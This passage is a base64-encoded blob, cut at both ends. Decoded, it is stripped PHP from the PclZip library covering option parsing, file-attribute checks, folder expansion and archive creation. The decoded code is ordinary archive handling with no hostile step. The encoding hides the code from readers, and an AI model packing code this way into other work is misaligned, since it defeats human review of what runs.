9uc19saXN0WyRpXV1bJGpdWydzdGFydCddIDwgJHZfc29ydF92YWx1ZSkgew0KICAgICAgICAgICAgICAgICR2X3NvcnRfZmxhZz10cnVlOw0KDQogICAgICAgICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX09QVElPTl9WQUxVRSwgIkludmFsaWQgb3JkZXIgb2YgaW5kZXggcmFuZ2UgZm9yIG9wdGlvbiAnIi5QY2xaaXBVdGlsT3B0aW9uVGV4dCgkcF9vcHRpb25zX2xpc3RbJGldKS4iJyIpOw0KDQogICAgICAgICAgICAgICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkdl9zb3J0X3ZhbHVlID0gJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV1bJGpdWydzdGFydCddOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBpZiAoJHZfc29ydF9mbGFnKSB7DQogICAgICAgIH0NCg0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX09QVF9SRU1PVkVfQUxMX1BBVEggOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX0VYVFJBQ1RfQVNfU1RSSU5HIDoNCiAgICAgIGNhc2UgUENMWklQX09QVF9OT19DT01QUkVTU0lPTiA6DQogICAgICBjYXNlIFBDTFpJUF9PUFRfRVhUUkFDVF9JTl9PVVRQVVQgOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1JFUExBQ0VfTkVXRVIgOg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1NUT1BfT05fRVJST1IgOg0KICAgICAgICAkdl9yZXN1bHRfbGlzdFskcF9vcHRpb25zX2xpc3RbJGldXSA9IHRydWU7DQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfT1BUX1NFVF9DSE1PRCA6DQogICAgICAgIGlmICgoJGkrMSkgPj0gJHBfc2l6ZSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19PUFRJT05fVkFMVUUsICJNaXNzaW5nIHBhcmFtZXRlciB2YWx1ZSBmb3Igb3B0aW9uICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCRwX29wdGlvbnNfbGlzdFskaV0pLiInIik7DQoNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICR2X3Jlc3VsdF9saXN0WyRwX29wdGlvbnNfbGlzdFskaV1dID0gJHBfb3B0aW9uc19saXN0WyRpKzFdOw0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0NCX1BSRV9FWFRSQUNUIDoNCiAgICAgIGNhc2UgUENMWklQX0NCX1BPU1RfRVhUUkFDVCA6DQogICAgICBjYXNlIFBDTFpJUF9DQl9QUkVfQUREIDoNCiAgICAgIGNhc2UgUENMWklQX0NCX1BPU1RfQUREIDoNCiAgICAgICAgaWYgKCgkaSsxKSA+PSAkcF9zaXplKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9NSVNTSU5HX09QVElPTl9WQUxVRSwgIk1pc3NpbmcgcGFyYW1ldGVyIHZhbHVlIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHZfZnVuY3Rpb25fbmFtZSA9ICRwX29wdGlvbnNfbGlzdFskaSsxXTsNCg0KICAgICAgICBpZiAoIWZ1bmN0aW9uX2V4aXN0cygkdl9mdW5jdGlvbl9uYW1lKSkgew0KICAgICAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9PUFRJT05fVkFMVUUsICJGdW5jdGlvbiAnIi4kdl9mdW5jdGlvbl9uYW1lLiIoKScgaXMgbm90IGFuIGV4aXN0aW5nIGZ1bmN0aW9uIGZvciBvcHRpb24gJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHBfb3B0aW9uc19saXN0WyRpXSkuIiciKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHZfcmVzdWx0X2xpc3RbJHBfb3B0aW9uc19saXN0WyRpXV0gPSAkdl9mdW5jdGlvbl9uYW1lOw0KICAgICAgICAkaSsrOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGRlZmF1bHQgOg0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLA0KCSAgICAgICAgICAgICAgICAgICAgICAgIlVua25vd24gcGFyYW1ldGVyICciDQoJCQkJCQkgICAuJHBfb3B0aW9uc19saXN0WyRpXS4iJyIpOw0KDQogICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgICRpKys7DQogIH0NCg0KICBpZiAoJHZfcmVxdWVzdGVkX29wdGlvbnMgIT09IGZhbHNlKSB7DQogICAgZm9yICgka2V5PXJlc2V0KCR2X3JlcXVlc3RlZF9vcHRpb25zKTsgJGtleT1rZXkoJHZfcmVxdWVzdGVkX29wdGlvbnMpOyAka2V5PW5leHQoJHZfcmVxdWVzdGVkX29wdGlvbnMpKSB7DQogICAgICBpZiAoJHZfcmVxdWVzdGVkX29wdGlvbnNbJGtleV0gPT0gJ21hbmRhdG9yeScpIHsNCiAgICAgICAgaWYgKCFpc3NldCgkdl9yZXN1bHRfbGlzdFska2V5XSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiTWlzc2luZyBtYW5kYXRvcnkgcGFyYW1ldGVyICIuUGNsWmlwVXRpbE9wdGlvblRleHQoJGtleSkuIigiLiRrZXkuIikiKTsNCg0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQogICAgICB9DQogICAgfQ0KICB9DQogIA0KICBpZiAoIWlzc2V0KCR2X3Jlc3VsdF9saXN0W1BDTFpJUF9PUFRfVEVNUF9GSUxFX1RIUkVTSE9MRF0pKSB7DQogICAgDQogIH0NCg0KICByZXR1cm4gJHZfcmVzdWx0Ow0KfQ0KDQpmdW5jdGlvbiBwcml2T3B0aW9uRGVmYXVsdFRocmVzaG9sZCgmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICBpZiAoaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTERdKQ0KICAgICAgfHwgaXNzZXQoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9PRkZdKSkgew0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCiAgDQogICR2X21lbW9yeV9saW1pdCA9IGluaV9nZXQoJ21lbW9yeV9saW1pdCcpOw0KICAkdl9tZW1vcnlfbGltaXQgPSB0cmltKCR2X21lbW9yeV9saW1pdCk7DQogICRsYXN0ID0gc3RydG9sb3dlcihzdWJzdHIoJHZfbWVtb3J5X2xpbWl0LCAtMSkpOw0KDQogIGlmKCRsYXN0ID09ICdnJykNCiAgICAgICR2X21lbW9yeV9saW1pdCA9ICR2X21lbW9yeV9saW1pdCoxMDczNzQxODI0Ow0KICBpZigkbGFzdCA9PSAnbScpDQogICAgICAkdl9tZW1vcnlfbGltaXQgPSAkdl9tZW1vcnlfbGltaXQqMTA0ODU3NjsNCiAgaWYoJGxhc3QgPT0gJ2snKQ0KICAgICAgJHZfbWVtb3J5X2xpbWl0ID0gJHZfbWVtb3J5X2xpbWl0KjEwMjQ7DQogICAgICAgICAgDQogICRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSA9IGZsb29yKCR2X21lbW9yeV9saW1pdCpQQ0xaSVBfVEVNUE9SQVJZX0ZJTEVfUkFUSU8pOw0KICANCg0KICBpZiAoJHBfb3B0aW9uc1tQQ0xaSVBfT1BUX1RFTVBfRklMRV9USFJFU0hPTERdIDwgMTA0ODU3Nikgew0KICAgIHVuc2V0KCRwX29wdGlvbnNbUENMWklQX09QVF9URU1QX0ZJTEVfVEhSRVNIT0xEXSk7DQogIH0NCiAgICAgICAgDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZGaWxlRGVzY3JQYXJzZUF0dCgmJHBfZmlsZV9saXN0LCAmJHBfZmlsZWRlc2NyLCAkdl9vcHRpb25zLCAkdl9yZXF1ZXN0ZWRfb3B0aW9ucz1mYWxzZSkNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICBmb3JlYWNoICgkcF9maWxlX2xpc3QgYXMgJHZfa2V5ID0+ICR2X3ZhbHVlKSB7DQogIA0KICAgIGlmICghaXNzZXQoJHZfcmVxdWVzdGVkX29wdGlvbnNbJHZfa2V5XSkpIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfSU5WQUxJRF9QQVJBTUVURVIsICJJbnZhbGlkIGZpbGUgYXR0cmlidXRlICciLiR2X2tleS4iJyBmb3IgdGhpcyBmaWxlIik7DQoNCiAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgIH0NCg0KICAgIHN3aXRjaCAoJHZfa2V5KSB7DQogICAgICBjYXNlIFBDTFpJUF9BVFRfRklMRV9OQU1FIDoNCiAgICAgICAgaWYgKCFpc19zdHJpbmcoJHZfdmFsdWUpKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgdHlwZSAiLmdldHR5cGUoJHZfdmFsdWUpLiIuIFN0cmluZyBleHBlY3RlZCBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVkZXNjclsnZmlsZW5hbWUnXSA9IFBjbFppcFV0aWxQYXRoUmVkdWN0aW9uKCR2X3ZhbHVlKTsNCiAgICAgICAgDQogICAgICAgIGlmICgkcF9maWxlZGVzY3JbJ2ZpbGVuYW1lJ10gPT0gJycpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCBlbXB0eSBmaWxlbmFtZSBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICBicmVhazsNCg0KICAgICAgY2FzZSBQQ0xaSVBfQVRUX0ZJTEVfTkVXX1NIT1JUX05BTUUgOg0KICAgICAgICBpZiAoIWlzX3N0cmluZygkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gU3RyaW5nIGV4cGVjdGVkIGZvciBhdHRyaWJ1dGUgJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHZfa2V5KS4iJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHBfZmlsZWRlc2NyWyduZXdfc2hvcnRfbmFtZSddID0gUGNsWmlwVXRpbFBhdGhSZWR1Y3Rpb24oJHZfdmFsdWUpOw0KDQogICAgICAgIGlmICgkcF9maWxlZGVzY3JbJ25ld19zaG9ydF9uYW1lJ10gPT0gJycpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCBlbXB0eSBzaG9ydCBmaWxlbmFtZSBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0FUVF9GSUxFX05FV19GVUxMX05BTUUgOg0KICAgICAgICBpZiAoIWlzX3N0cmluZygkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gU3RyaW5nIGV4cGVjdGVkIGZvciBhdHRyaWJ1dGUgJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHZfa2V5KS4iJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHBfZmlsZWRlc2NyWyduZXdfZnVsbF9uYW1lJ10gPSBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkdl92YWx1ZSk7DQoNCiAgICAgICAgaWYgKCRwX2ZpbGVkZXNjclsnbmV3X2Z1bGxfbmFtZSddID09ICcnKSB7DQogICAgICAgICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9JTlZBTElEX0FUVFJJQlVURV9WQUxVRSwgIkludmFsaWQgZW1wdHkgZnVsbCBmaWxlbmFtZSBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0FUVF9GSUxFX0NPTU1FTlQgOg0KICAgICAgICBpZiAoIWlzX3N0cmluZygkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gU3RyaW5nIGV4cGVjdGVkIGZvciBhdHRyaWJ1dGUgJyIuUGNsWmlwVXRpbE9wdGlvblRleHQoJHZfa2V5KS4iJyIpOw0KICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgJHBfZmlsZWRlc2NyWydjb21tZW50J10gPSAkdl92YWx1ZTsNCiAgICAgIGJyZWFrOw0KDQogICAgICBjYXNlIFBDTFpJUF9BVFRfRklMRV9NVElNRSA6DQogICAgICAgIGlmICghaXNfaW50ZWdlcigkdl92YWx1ZSkpIHsNCiAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfQVRUUklCVVRFX1ZBTFVFLCAiSW52YWxpZCB0eXBlICIuZ2V0dHlwZSgkdl92YWx1ZSkuIi4gSW50ZWdlciBleHBlY3RlZCBmb3IgYXR0cmlidXRlICciLlBjbFppcFV0aWxPcHRpb25UZXh0KCR2X2tleSkuIiciKTsNCiAgICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRwX2ZpbGVkZXNjclsnbXRpbWUnXSA9ICR2X3ZhbHVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGNhc2UgUENMWklQX0FUVF9GSUxFX0NPTlRFTlQgOg0KICAgICAgICAkcF9maWxlZGVzY3JbJ2NvbnRlbnQnXSA9ICR2X3ZhbHVlOw0KICAgICAgYnJlYWs7DQoNCiAgICAgIGRlZmF1bHQgOg0KICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLA0KCSAgICAgICAgICAgICAgICAgICAgICAgICAgICJVbmtub3duIHBhcmFtZXRlciAnIi4kdl9rZXkuIiciKTsNCg0KICAgICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQoNCiAgICBpZiAoJHZfcmVxdWVzdGVkX29wdGlvbnMgIT09IGZhbHNlKSB7DQogICAgICBmb3IgKCRrZXk9cmVzZXQoJHZfcmVxdWVzdGVkX29wdGlvbnMpOyAka2V5PWtleSgkdl9yZXF1ZXN0ZWRfb3B0aW9ucyk7ICRrZXk9bmV4dCgkdl9yZXF1ZXN0ZWRfb3B0aW9ucykpIHsNCiAgICAgICAgaWYgKCR2X3JlcXVlc3RlZF9vcHRpb25zWyRrZXldID09ICdtYW5kYXRvcnknKSB7DQogICAgICAgICAgaWYgKCFpc3NldCgkcF9maWxlX2xpc3RbJGtleV0pKSB7DQogICAgICAgICAgICBQY2xaaXA6OnByaXZFcnJvckxvZyhQQ0xaSVBfRVJSX0lOVkFMSURfUEFSQU1FVEVSLCAiTWlzc2luZyBtYW5kYXRvcnkgcGFyYW1ldGVyICIuUGNsWmlwVXRpbE9wdGlvblRleHQoJGtleSkuIigiLiRrZXkuIikiKTsNCiAgICAgICAgICAgIHJldHVybiBQY2xaaXA6OmVycm9yQ29kZSgpOw0KICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCiAgDQogIH0NCiAgDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZGaWxlRGVzY3JFeHBhbmQoJiRwX2ZpbGVkZXNjcl9saXN0LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogIA0KICAkdl9yZXN1bHRfbGlzdCA9IGFycmF5KCk7DQogIA0KICBmb3IgKCRpPTA7ICRpPHNpemVvZigkcF9maWxlZGVzY3JfbGlzdCk7ICRpKyspIHsNCiAgICANCiAgICAkdl9kZXNjciA9ICRwX2ZpbGVkZXNjcl9saXN0WyRpXTsNCiAgICANCiAgICAkdl9kZXNjclsnZmlsZW5hbWUnXSA9IFBjbFppcFV0aWxUcmFuc2xhdGVXaW5QYXRoKCR2X2Rlc2NyWydmaWxlbmFtZSddLCBmYWxzZSk7DQogICAgJHZfZGVzY3JbJ2ZpbGVuYW1lJ10gPSBQY2xaaXBVdGlsUGF0aFJlZHVjdGlvbigkdl9kZXNjclsnZmlsZW5hbWUnXSk7DQogICAgDQogICAgaWYgKGZpbGVfZXhpc3RzKCR2X2Rlc2NyWydmaWxlbmFtZSddKSkgew0KICAgICAgaWYgKEBpc19maWxlKCR2X2Rlc2NyWydmaWxlbmFtZSddKSkgew0KICAgICAgICAkdl9kZXNjclsndHlwZSddID0gJ2ZpbGUnOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoQGlzX2Rpcigkdl9kZXNjclsnZmlsZW5hbWUnXSkpIHsNCiAgICAgICAgJHZfZGVzY3JbJ3R5cGUnXSA9ICdmb2xkZXInOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZiAoQGlzX2xpbmsoJHZfZGVzY3JbJ2ZpbGVuYW1lJ10pKSB7DQogICAgICAgIGNvbnRpbnVlOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQogICAgICAgIGNvbnRpbnVlOw0KICAgICAgfQ0KICAgIH0NCiAgICANCiAgICBlbHNlIGlmIChpc3NldCgkdl9kZXNjclsnY29udGVudCddKSkgew0KICAgICAgJHZfZGVzY3JbJ3R5cGUnXSA9ICd2aXJ0dWFsX2ZpbGUnOw0KICAgIH0NCiAgICANCiAgICBlbHNlIHsNCiAgICAgIFBjbFppcDo6cHJpdkVycm9yTG9nKFBDTFpJUF9FUlJfTUlTU0lOR19GSUxFLCAiRmlsZSAnIi4kdl9kZXNjclsnZmlsZW5hbWUnXS4iJyBkb2VzIG5vdCBleGlzdCIpOw0KDQogICAgICByZXR1cm4gUGNsWmlwOjplcnJvckNvZGUoKTsNCiAgICB9DQogICAgDQogICAgJHRoaXMtPnByaXZDYWxjdWxhdGVTdG9yZWRGaWxlbmFtZSgkdl9kZXNjciwgJHBfb3B0aW9ucyk7DQogICAgDQogICAgJHZfcmVzdWx0X2xpc3Rbc2l6ZW9mKCR2X3Jlc3VsdF9saXN0KV0gPSAkdl9kZXNjcjsNCiAgICANCiAgICBpZiAoJHZfZGVzY3JbJ3R5cGUnXSA9PSAnZm9sZGVyJykgew0KICAgICAgJHZfZGlybGlzdF9kZXNjciA9IGFycmF5KCk7DQogICAgICAkdl9kaXJsaXN0X25iID0gMDsNCiAgICAgIGlmICgkdl9mb2xkZXJfaGFuZGxlciA9IEBvcGVuZGlyKCR2X2Rlc2NyWydmaWxlbmFtZSddKSkgew0KICAgICAgICB3aGlsZSAoKCR2X2l0ZW1faGFuZGxlciA9IEByZWFkZGlyKCR2X2ZvbGRlcl9oYW5kbGVyKSkgIT09IGZhbHNlKSB7DQoNCiAgICAgICAgICBpZiAoKCR2X2l0ZW1faGFuZGxlciA9PSAnLicpIHx8ICgkdl9pdGVtX2hhbmRsZXIgPT0gJy4uJykpIHsNCiAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgfQ0KICAgICAgICAgIA0KICAgICAgICAgICR2X2Rpcmxpc3RfZGVzY3JbJHZfZGlybGlzdF9uYl1bJ2ZpbGVuYW1lJ10gPSAkdl9kZXNjclsnZmlsZW5hbWUnXS4nLycuJHZfaXRlbV9oYW5kbGVyOw0KICAgICAgICAgIA0KICAgICAgICAgIGlmICgoJHZfZGVzY3JbJ3N0b3JlZF9maWxlbmFtZSddICE9ICR2X2Rlc2NyWydmaWxlbmFtZSddKQ0KICAgICAgICAgICAgICAgJiYgKCFpc3NldCgkcF9vcHRpb25zW1BDTFpJUF9PUFRfUkVNT1ZFX0FMTF9QQVRIXSkpKSB7DQogICAgICAgICAgICBpZiAoJHZfZGVzY3JbJ3N0b3JlZF9maWxlbmFtZSddICE9ICcnKSB7DQogICAgICAgICAgICAgICR2X2Rpcmxpc3RfZGVzY3JbJHZfZGlybGlzdF9uYl1bJ25ld19mdWxsX25hbWUnXSA9ICR2X2Rlc2NyWydzdG9yZWRfZmlsZW5hbWUnXS4nLycuJHZfaXRlbV9oYW5kbGVyOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICR2X2Rpcmxpc3RfZGVzY3JbJHZfZGlybGlzdF9uYl1bJ25ld19mdWxsX25hbWUnXSA9ICR2X2l0ZW1faGFuZGxlcjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgDQogICAgICAgICAgJHZfZGlybGlzdF9uYisrOw0KICAgICAgICB9DQogICAgICAgIA0KICAgICAgICBAY2xvc2VkaXIoJHZfZm9sZGVyX2hhbmRsZXIpOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQogICAgICB9DQogICAgICANCiAgICAgIGlmICgkdl9kaXJsaXN0X25iICE9IDApIHsNCiAgICAgICAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdkZpbGVEZXNjckV4cGFuZCgkdl9kaXJsaXN0X2Rlc2NyLCAkcF9vcHRpb25zKSkgIT0gMSkgew0KICAgICAgICAgIHJldHVybiAkdl9yZXN1bHQ7DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgICR2X3Jlc3VsdF9saXN0ID0gYXJyYXlfbWVyZ2UoJHZfcmVzdWx0X2xpc3QsICR2X2Rpcmxpc3RfZGVzY3IpOw0KICAgICAgfQ0KICAgICAgZWxzZSB7DQogICAgICB9DQogICAgICAgIA0KICAgICAgdW5zZXQoJHZfZGlybGlzdF9kZXNjcik7DQogICAgfQ0KICB9DQogIA0KICAkcF9maWxlZGVzY3JfbGlzdCA9ICR2X3Jlc3VsdF9saXN0Ow0KDQogIHJldHVybiAkdl9yZXN1bHQ7DQp9DQoNCmZ1bmN0aW9uIHByaXZDcmVhdGUoJHBfZmlsZWRlc2NyX2xpc3QsICYkcF9yZXN1bHRfbGlzdCwgJiRwX29wdGlvbnMpDQp7DQogICR2X3Jlc3VsdD0xOw0KICAkdl9saXN0X2RldGFpbCA9IGFycmF5KCk7DQogIA0KICAkdGhpcy0+cHJpdkRpc2FibGVNYWdpY1F1b3RlcygpOw0KDQogIGlmICgoJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZPcGVuRmQoJ3diJykpICE9IDEpDQogIHsNCiAgICByZXR1cm4gJHZfcmVzdWx0Ow0KICB9DQoNCiAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZBZGRMaXN0KCRwX2ZpbGVkZXNjcl9saXN0LCAkcF9yZXN1bHRfbGlzdCwgJHBfb3B0aW9ucyk7DQoNCiAgJHRoaXMtPnByaXZDbG9zZUZkKCk7DQoNCiAgJHRoaXMtPnByaXZTd2FwQmFja01hZ2ljUXVvdGVzKCk7DQoNCiAgcmV0dXJuICR2X3Jlc3VsdDsNCn0NCg0KZnVuY3Rpb24gcHJpdkFkZCgkcF9maWxlZGVzY3JfbGlzdCwgJiRwX3Jlc3VsdF9saXN0LCAmJHBfb3B0aW9ucykNCnsNCiAgJHZfcmVzdWx0PTE7DQogICR2X2xpc3RfZGV0YWlsID0gYXJyYXkoKTsNCg0KICBpZiAoKCFpc19maWxlKCR0aGlzLT56aXBuYW1lKSkgfHwgKGZpbGVzaXplKCR0aGlzLT56aXBuYW1lKSA9PSAwKSkNCiAgew0KDQogICAgJHZfcmVzdWx0ID0gJHRoaXMtPnByaXZDcmVhdGUoJHBfZmlsZWRlc2NyX2xpc3QsICRwX3Jlc3VsdF9saXN0LCAkcF9vcHRpb25zKTsNCg0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCiAgJHRoaXMtPnByaXZEaXNhYmxlTWFnaWNRdW90ZXMoKTsNCg0KICBpZiAoKCR2X3Jlc3VsdD0kdGhpcy0+cHJpdk9wZW5GZCgncmInKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgcmV0dXJuICR2X3Jlc3VsdDsNCiAgfQ0KDQogICR2X2NlbnRyYWxfZGlyID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdlJlYWRFbmRDZW50cmFsRGlyKCR2X2NlbnRyYWxfZGlyKSkgIT0gMSkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KICAgIHJldHVybiAkdl9yZXN1bHQ7DQogIH0NCg0KICBAcmV3aW5kKCR0aGlzLT56aXBfZmQpOw0KDQogICR2X3ppcF90ZW1wX25hbWUgPSBQQ0xaSVBfVEVNUE9SQVJZX0RJUi51bmlxaWQoJ3BjbHppcC0nKS4nLnRtcCc7DQoNCiAgaWYgKCgkdl96aXBfdGVtcF9mZCA9IEBmb3Blbigkdl96aXBfdGVtcF9uYW1lLCAnd2InKSkgPT0gMCkNCiAgew0KICAgICR0aGlzLT5wcml2Q2xvc2VGZCgpOw0KICAgICR0aGlzLT5wcml2U3dhcEJhY2tNYWdpY1F1b3RlcygpOw0KDQogICAgUGNsWmlwOjpwcml2RXJyb3JMb2coUENMWklQX0VSUl9SRUFEX09QRU5fRkFJTCwgJ1VuYWJsZSB0byBvcGVuIHRlbXBvcmFyeSBmaWxlIFwnJy4kdl96aXBfdGVtcF9uYW1lLidcJyBpbiBiaW5hcnkgd3JpdGUgbW9kZScpOw0KDQogICAgcmV0dXJuIFBjbFppcDo6ZXJyb3JDb2RlKCk7DQogIH0NCg0KICAkdl9zaXplID0gJHZfY2VudHJhbF9kaXJbJ29mZnNldCddOw0KICB3aGlsZSAoJHZfc2l6ZSAhPSAwKQ0KICB7DQogICAgJHZfcmVhZF9zaXplID0gKCR2X3NpemUgPCBQQ0xaSVBfUkVBRF9CTE9DS19TSVpFID8gJHZfc2l6ZSA6IFBDTFpJUF9SRUFEX0JMT0NLX1NJWkUpOw0KICAgICR2X2J1ZmZlciA9IGZyZWFkKCR0aGlzLT56aXBfZmQsICR2X3JlYWRfc2l6ZSk7DQogICAgQGZ3cml0ZSgkdl96aXBfdGVtcF9mZCwgJHZfYnVmZmVyLCAkdl9yZWFkX3NpemUpOw0KICAgICR2X3NpemUgLT0gJHZfcmVhZF9zaXplOw0KICB9DQoNCiAgJHZfc3dhcCA9ICR0aGlzLT56aXBfZmQ7DQogICR0aGlzLT56aXBfZmQgPSAkdl96aXBfdGVtcF9mZDsNCiAgJHZfemlwX3RlbXBfZmQgPSAkdl9zd2FwOw0KDQogICR2X2hlYWRlcl9saXN0ID0gYXJyYXkoKTsNCiAgaWYgKCgkdl9yZXN1bHQgPSAkdGhpcy0+cHJpdk